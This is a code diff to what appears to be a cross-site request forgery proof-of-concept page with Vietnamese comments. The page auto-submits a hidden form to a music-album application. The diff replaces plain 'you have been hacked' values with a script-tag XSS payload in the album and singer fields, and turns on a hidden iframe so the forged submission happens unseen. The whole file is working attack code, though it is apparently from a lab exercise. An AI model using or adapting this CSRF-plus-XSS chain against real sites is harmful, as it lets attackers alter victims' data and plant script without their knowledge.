@@ -28,12 +28,14 @@
             var albumNameInput = document.createElement("input");
             albumNameInput.setAttribute("type", "hidden");
             albumNameInput.setAttribute("name", "albumname");
-            albumNameInput.setAttribute("value", "Ban da bi hack");
+            albumNameInput.setAttribute("value", "<script>alert('Da bi hack')<\/script>");
+            //albumNameInput.setAttribute("value", "Ban da bi hack");
 
             var singerNameInput = document.createElement("input");
             singerNameInput.setAttribute("type", "hidden");
             singerNameInput.setAttribute("name", "singername");
-            singerNameInput.setAttribute("value", "Ban da bi hack");
+            //singerNameInput.setAttribute("value", "Ban da bi hack");
+            singerNameInput.setAttribute("value", "<script>alert('Da bi hack')<\/script>");
 
             // var csrfTokenInput = document.createElement("input");
             // csrfTokenInput.setAttribute("type", "hidden");
@@ -45,27 +47,25 @@
             // form.appendChild(csrfTokenInput);
 
             // Tạo iframe ẩn và đặt tên cho nó
-    // var iframe = document.createElement("iframe");
-    // iframe.setAttribute("name", "hiddenFrame");
-    // iframe.style.display = "none";
+    var iframe = document.createElement("iframe");
+    iframe.setAttribute("name", "hiddenFrame");
+    iframe.style.display = "none";
 
-    // Thêm iframe vào trang
-    // document.body.appendChild(iframe);
+    document.body.appendChild(iframe);
 
-    // Đặt thuộc tính target của form thành tên iframe
-    // form.setAttribute("target", "hiddenFrame");
+    form.setAttribute("target", "hiddenFrame");
 
-    // Thêm form vào trang
-    document.body.appendChild(form);
+            // Thêm form vào trang
+            document.body.appendChild(form);
 
-    // Submit form
-    form.submit();
+            // Submit form
+            form.submit();
 
-    // Hiển thị thông điệp cảm ơn sau khi submit
-    // var thankYouMessage = document.createElement("h2");
-    // thankYouMessage.textContent = "Cảm ơn bạn đã điền thông tin!";
-    // document.body.appendChild(thankYouMessage);
-}
+            // Hiển thị thông điệp cảm ơn sau khi submit
+            var thankYouMessage = document.createElement("h2");
+            thankYouMessage.textContent = "Cảm ơn bạn đã điền thông tin!";
+            document.body.appendChild(thankYouMessage);
+        }
         
     </script>
 
